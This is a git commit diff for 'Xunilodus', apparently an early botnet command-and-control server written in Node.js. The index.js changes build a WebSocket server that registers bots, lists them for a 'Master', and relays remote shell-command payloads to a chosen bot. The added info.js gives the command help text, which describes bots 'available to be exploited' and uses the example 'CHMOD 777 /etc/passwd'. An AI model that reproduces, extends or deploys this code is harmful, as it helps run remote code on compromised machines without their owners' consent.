80090b57ad47f1999c41223a944764fc72829cec
MurylloEx <muryllopimenta@gmail.com>
2020-12-23 21:07:19 -0300

    First Xunilodus version release v0.0.1

--- index.js
+++ index.js
@@ -1,36 +1,56 @@
 //#region [ IMPORTS ]
 
-const WebSockets = require('websocket');
+const md5 = require('md5');
 const http = require('http');
+const info = require('./info');
+const nonce = require('nonce');
+const WebSockets = require('websocket');
+const { BotnetFrame, MessageType, SenderType, StatusCode, CommandFlags, CommandID } = require('./sfxtp');
+const yargs = require('yargs');
 
 //#endregion
 
-const server = http.createServer((req, res) => { res.writeHead(403).end(); });
+var argv = yargs.scriptName("Xunilodus")
+  .usage("Usage: $0 -p port_value")
+  .example(
+    "$0 -port 44335",
+    "Run the botnet server of Xunilodus on port 44335."
+  ).command('port', 'The port to listen for incoming connections.', {
+    'port': {
+      description: 'The port to listen for incoming connections.',
+      demandOption: "The port of server is required.",
+      type: 'number',
+    }
+  }).help().alias('help', 'h').argv;
 
-server.listen(1234, function () {
-  console.log((new Date()) + ' Server is listening on port 8080');
+if (!argv['port']){
+  console.log('[?] Parameter --port not specified. Presuming default 44335');
+  argv['port'] = 44335;
+}
+
+const server = http.createServer((req, res) => { res.writeHead(403); return res.end(); });
+
+server.listen(argv['port'], function () {
+  console.log(`[${(new Date()).toLocaleString()}] Xunilodus Server is listening on port ${argv['port']}.`);
 });
 
+//#region [ CONSTANTS ]
+
+const MaxSingleHostsConnections = 5;
 const WebSockServer = new WebSockets.server({
   httpServer: server,
   maxReceivedFrameSize: 65536,
   maxReceivedMessageSize: 65536
 });
 
-//#region [ CONSTANTS ]
+//#endregion
 
-const MaxSingleHostsConnections = 1;
-const BotnetCommandControls = [
-  '\x23\x1a\x20\x17', //Master -> Command Control         [  Unicast  ]
-  '\x27\x1c\x24\x19', //Command Control -> Bot            [  Unicast  ]
-  '\xff\x1c\xfe\x1b', //Bot -> Command Control            [  Unicast  ]
-  '\x9b\x1c\x66\x19', //Command Control -> Master         [  Unicast  ]
-  '\x9b\x9b\x9d\xff'  //Master -> Command Control -> All  [ Broadcast ]
-];
+//#region [ VARIABLES ]
 
-var OpennedSockets    = 0;
-var MaxOpennedSockets = 16;
-var SocketTable       = [];
+var OpennedSockets = 0;
+var MaxOpennedSockets = 32;
+var SocketTable = [];
+var ImpersonationTable = [];
 
 //#endregion
 
@@ -40,84 +60,220 @@ function IsAllowedOrigin(origin) {
   return true;
 }
 
-function SignatureCheck(m) {
-  if (m.length < 4)
-    return false;
-  let s1 = m.charCodeAt(0);
-  let s2 = m.charCodeAt(1);
-  let e1 = m.charCodeAt(m.length-2);
-  let e2 = m.charCodeAt(m.length-1);
-  return (s1 % (e1 + 1) == s2 % (e2 + 1));
-}
-
-//#endregion
-
-//#region [ EVENT LISTENERS ]
-
-function FwdMasterToCommandControlEvt(payload){
-  //TODO
-}
-
-function FwdCommandControlToBotEvt(payload){
-  //TODO
-}
-
-function FwdBotToCommandControlEvt(payload){
-  //TODO
-}
-
-function FwdCommandControlToMasterEvt(payload){
-  //TODO
-}
-
-function FwdMasterToCommandControlToAllEvt(payload){
-  //TODO
-}
-
-//#endregion
-
-//#region [ PACKET ROUTER ]
-
-function OnPacketReceived(m){
-  let msig = [
-    m[0], m[1],
-    m[m.length-2],
-    m[m.length-1]
-  ];
-  let payload = m.substr(2).substr(0, m.length-4);
-  try{ payload = JSON.parse(payload); } catch(e){ return false; }
-  msig = msig.join('');
-  if (msig == BotnetCommandControls[0]){
-    FwdMasterToCommandControlEvt(payload);
-  } else 
-  if (msig == BotnetCommandControls[1]) {
-    FwdCommandControlToBotEvt(payload);
-  } else 
-  if (msig == BotnetCommandControls[2]) {
-    FwdBotToCommandControlEvt(payload);
-  } else 
-  if (msig == BotnetCommandControls[3]) {
-    FwdCommandControlToMasterEvt(payload);
-  } else 
-  if (msig == BotnetCommandControls[4]) {
-    FwdMasterToCommandControlToAllEvt(payload);
-  } else {
-    return false;
+function ReadSocketByFingerprint(fingerprint) {
+  for (let idx = 0; idx < SocketTable.length; idx++) {
+    if (SocketTable[idx].Fingerprint == fingerprint)
+      return SocketTable[idx];
   }
+  return null;
+}
+
+function ApplyDepersonification(srcFingerprint){
+  return !!(ImpersonationTable = ImpersonationTable.filter((obj) => { return (obj.SourceFingerprint != srcFingerprint); }));
+}
+
+function VerifyImpersonation(srcFingerprint, destFingerprint){
+  for (let x = 0; x < ImpersonationTable.length; x++)
+    if ((ImpersonationTable[x].SourceFingerprint == srcFingerprint) && ((ImpersonationTable[x].DestinationFingerprint == destFingerprint) || !destFingerprint))
+      return true;
+  return false;
+}
+
+function ApplyImpersonation(srcFingerprint, destFingerprint){
+  if (VerifyImpersonation(srcFingerprint, null) || !ReadSocketByFingerprint(destFingerprint))
+    return false;
+  ImpersonationTable.push({ SourceFingerprint: srcFingerprint, DestinationFingerprint: destFingerprint });
   return true;
 }
 
 //#endregion
 
+//#region [ TUNNELING FUNCTIONS ]
+
+/**
+ * @param {string} srcFingerprint The SFBTP datagram
+ * @param {BotnetFrame} frame The SFBTP datagram
+ */
+function OnFrameReceived(srcFingerprint, frame){
+  let Socket = ReadSocketByFingerprint(srcFingerprint);
+  if (Socket === null)
+    return;
+  switch (frame.MessageType){
+    case MessageType.QUERY:{
+
+      switch (frame.SenderType){
+        case SenderType.MASTER:{
+
+          switch (frame.StatusCode){
+            case StatusCode.QUERY_SENT:{
+              let Data;
+              let Status = StatusCode.RESPONSE_SENT;
+              let Type = MessageType.RESPONSE;
+              switch (frame.CommandID){
+                case CommandID.IMPERSONATE:{
+                  if (ApplyImpersonation(srcFingerprint, frame.TargetFingerprint.toString(16).toUpperCase())){
+                    Data = { "message": info.command_messages.IMPERSONATE.success }
+                  } else {
+                    Data = { "message": info.command_messages.IMPERSONATE.failed  }
+                    Status = StatusCode.ERROR_STATUS;
+                  }
+                  Data = JSON.stringify(Data);
+                  Socket.send(
+                    BotnetFrame.build(
+                      Type, frame.SequenceID,
+                      SenderType.COMMAND_CONTROL,
+                      parseInt(srcFingerprint, 16),
+                      frame.CommandFlags, 0, Status,
+                      frame.CommandID, 0xababcdcd, Data
+                    ).Bytes
+                  );
+                } break;
+                case CommandID.DEPERSONATE:{
+                  if (ApplyDepersonification(srcFingerprint)){
+                    Data = { "message": info.command_messages.DEPERSONATE.success }
+                  } else {
+                    Data = { "message": info.command_messages.DEPERSONATE.failed  }
+                    Status = StatusCode.ERROR_STATUS;
+                  }
+                  Data = JSON.stringify(Data);
+                  Socket.send(
+                    BotnetFrame.build(
+                      Type, frame.SequenceID,
+                      SenderType.COMMAND_CONTROL,
+                      parseInt(srcFingerprint, 16),
+                      frame.CommandFlags, 0, Status,
+                      frame.CommandID, 0xababcdcd, Data
+                    ).Bytes
+                  );
+                } break;
+                case CommandID.EXECUTE_SHELLCODE:{
+                  let DestinationSocket;
+                  if (VerifyImpersonation(srcFingerprint, frame.TargetFingerprint.toString(16).toUpperCase())){
+                    Status = StatusCode.QUERY_SENT;
+                    Type = MessageType.QUERY;
+                    Data = frame.Payload;
+                    DestinationSocket = ReadSocketByFingerprint(frame.TargetFingerprint.toString(16).toUpperCase());
+                  } else {
+                    Status = StatusCode.ERROR_STATUS;
+                    Type = MessageType.RESPONSE;
+                    Data = { "message": info.command_messages.EXECUTE_SHELLCODE.failed }
+                    DestinationSocket = Socket;
+                  }
+                  DestinationSocket.send(
+                    BotnetFrame.build(
+                      Type, frame.SequenceID,
+                      SenderType.COMMAND_CONTROL,
+                      parseInt(srcFingerprint, 16),
+                      frame.CommandFlags, 0, Status,
+                      frame.CommandID, 0xababcdcd, Data
+                    ).Bytes
+                  );
+                } break;
+              }
+            } break;
+            case StatusCode.QUERY_INFO:{
+              let Data;
+              switch (frame.CommandID){
+                case CommandID.HELP:{
+                  Data = JSON.stringify(info.command_list);
+                } break;
+                case CommandID.LIST_BOTS:{
+                  Data = [];
+                  for (let k = 0; k < SocketTable.length; k++)
+                    Data.push({
+                      "RemoteAddress": SocketTable[k].remoteAddress,
+                      "Fingerprint": SocketTable[k].Fingerprint,
+                      "IsOwnDevice": (SocketTable[k].Fingerprint == srcFingerprint)
+                    });
+                  Data = JSON.stringify(Data);
+                } break;
+              }
+              Socket.send( 
+                BotnetFrame.build(
+                  MessageType.RESPONSE,
+                  frame.SequenceID,
+                  SenderType.COMMAND_CONTROL,
+                  parseInt(srcFingerprint, 16), 
+                  frame.CommandFlags, 0, 
+                  StatusCode.RESPONSE_INFO,
+                  frame.CommandID, 0xababcdcd, Data
+                ).Bytes
+              );
+            } break;
+            case StatusCode.QUERY_AND_WAIT:{
+              //Not supported yet
+            } break;
+          }
+
+        } break;
+        case SenderType.BOT:{
+          //Bots cannot execute queries for security purposes
+        } break;
+      }
+
+    } break;
+    case MessageType.RESPONSE:{
+
+      switch (frame.SenderType){
+        case SenderType.MASTER:{
+          //Masters cannot respond queries for security purposes
+        } break;
+        case SenderType.BOT:{
+
+          switch (frame.StatusCode) {
+            case StatusCode.RESPONSE_SENT:{
+              let DestinationSocket = ReadSocketByFingerprint(frame.TargetFingerprint);
+              DestinationSocket.send(
+                BotnetFrame.build(
+                  MessageType.RESPONSE, frame.SequenceID,
+                  SenderType.COMMAND_CONTROL,
+                  parseInt(srcFingerprint, 16),
+                  frame.CommandFlags, 0, StatusCode.RESPONSE_SENT,
+                  frame.CommandID, 0xababcdcd, frame.Payload
+                ).Bytes
+              );
+            } break;
+            case StatusCode.ERROR_STATUS:{
+              let DestinationSocket = ReadSocketByFingerprint(frame.TargetFingerprint);
+              DestinationSocket.send(
+                BotnetFrame.build(
+                  MessageType.RESPONSE, frame.SequenceID,
+                  SenderType.COMMAND_CONTROL,
+                  parseInt(srcFingerprint, 16),
+                  frame.CommandFlags, 0, StatusCode.ERROR_STATUS,
+                  frame.CommandID, 0xababcdcd, frame.Payload
+                ).Bytes
+              );
+            } break;
+            case StatusCode.RESPONSE_WAIT_FRAGMENT:{
+              //Not supported yet
+            } break;
+            case StatusCode.RESPONSE_WAIT_FRAGMENT || StatusCode.RESPONSE_SENT:{
+              //Not supported yet
+            } break;
+          }
+
+        } break;
+      }
+
+    } break;
+  }
+}
+
+//#endregion
+
+//#region [ SOCKET LISTENERS ]
+
 WebSockServer.on('connect', (connection) => {
   OpennedSockets++;
   connection.on('message', (message) => {
-    if (message.type == 'utf8'){
-      let buffer = message.utf8Data;
-      if (!SignatureCheck(buffer))
-        connection.drop(403, 'Invalid signature provided');
-      if (!OnPacketReceived(buffer))
-        connection.drop(403, 'Cannot parse the payload data');
+    if (message.type == 'binary') {
+      let buffer = message.binaryData;
+      try{
+        OnFrameReceived(connection.Fingerprint, new BotnetFrame(buffer));
+      } catch (e){
+        connection.drop(403, 'Invalid buffer received');
+      }
     } else {
       connection.drop(403, 'Invalid buffer received');
     }
@@ -125,32 +281,38 @@ WebSockServer.on('connect', (connection) => {
 });
 
 WebSockServer.on('request', (request) => {
-  (IsAllowedOrigin(request.origin) ? () => { 
-    if (OpennedSockets == MaxOpennedSockets){
+  (IsAllowedOrigin(request.origin) ? () => {
+    if (OpennedSockets == MaxOpennedSockets) {
       request.reject(503, 'Maximum concurrent socket connections limit hit');
-    } 
+    }
     else {
       let NumOfConnections = 0;
-      for (let scki = 0; scki < SocketTable.length; scki++){
-        if ((SocketTable[scki].connected == true) && (SocketTable[scki].remoteAddress == request.remoteAddress)){
+      for (let scki = 0; scki < SocketTable.length; scki++) {
+        if ((SocketTable[scki].connected == true) && (SocketTable[scki].remoteAddress == request.remoteAddress)) {
           NumOfConnections++;
         }
       }
-      if (NumOfConnections < MaxSingleHostsConnections){
-        SocketTable.push(request.accept());
+      if (NumOfConnections < MaxSingleHostsConnections) {
+        let Socket = request.accept();
+        Socket.Fingerprint = md5(request.key + nonce(128)()).substring(0, 8).toUpperCase();
+        SocketTable.push(Socket);
+        console.log(`[+] Client [${Socket.Fingerprint}] connected.`);
       } else {
-        request.reject(403, 'Maximum concurrent single hosts connections limit hit'); 
+        request.reject(403, 'Maximum concurrent single hosts connections limit hit');
       }
     }
-  } : () => { 
-    request.reject(403, 'Access Denied'); 
+  } : () => {
+    request.reject(403, 'Access Denied');
   })();
 });
 
 WebSockServer.on('close', (connection, reasonCode, desc) => {
+  console.log(`[-] Client [${connection.Fingerprint}] disconnected.`);
   SocketTable = SocketTable.filter((sock, _idx, _socktable) => {
-    return !((sock.remoteAddress == connection.remoteAddress) || (sock == connection));
+    return !((sock.Fingerprint == connection.Fingerprint));
   });
   if (OpennedSockets > 0)
     OpennedSockets--;
 });
+
+//#endregion
---
+++ info.js
@@ -0,0 +1,42 @@
+module.exports = {
+  command_list: [
+    {
+      "cmd_name": "HELP",
+      "cmd_desc": "Help command provides info about all commands that can be used in Xunilodus.",
+      "cmd_usage": "Type \"HELP\"."
+    },
+    {
+      "cmd_name": "LIST-BOTS",
+      "cmd_desc": "This command show to Master's all bots available to be exploited be Xunilodus.",
+      "cmd_usage": "Type \"LIST-BOTS\"."
+    },
+    {
+      "cmd_name": "IMPERSONATE",
+      "cmd_desc": "This command perform an IMPERSONATION in the level of destination fingerprint. Using this command, the Master's can execute remote shellcodes.",
+      "cmd_usage": "Type \"IMPERSONATE --FINGERPRINT=FA5B36CD\"."
+    },
+    {
+      "cmd_name": "DEPERSONATE",
+      "cmd_desc": "This command perform an DEPERSONIFICATION in the level of all destination fingerprints. Using this command, the Master's cannot execure remote shellcodes in previous impersonated device.",
+      "cmd_usage": "Type \"DEPERSONATE\"."
+    },
+    {
+      "cmd_name": "EXECUTE-SHELLCODE",
+      "cmd_desc": "This command allows master to execute remote shellcode in previous impersonated devices.",
+      "cmd_usage": "Type \"EXECUTE-SHELLCODE --SHELL=\"CHMOD 777 /etc/passwd\"\"\nOptional Flags:\n--INVISIBLE\n--VISIBLE\n--MAXIMIZED\n--MINIMIZED."
+    }
+  ],
+  command_messages: {
+    "IMPERSONATE":{
+      success: "The target has been impersonated with success. You can execute remote shellcode into device now.",
+      failed: "Failed to impersonate the remote device. Check if the remote fingerprint is valid or if you already is impersonating another device."
+    },
+    "DEPERSONATE":{
+      success: "The remote device has been depersonated with success.",
+      failed: "Cannot depersonate the remote device."
+    },
+    "EXECUTE_SHELLCODE":{
+      failed: "Cannot send the shellcode to the remote device. Check if you impersonated any device."
+    }
+  }
+}
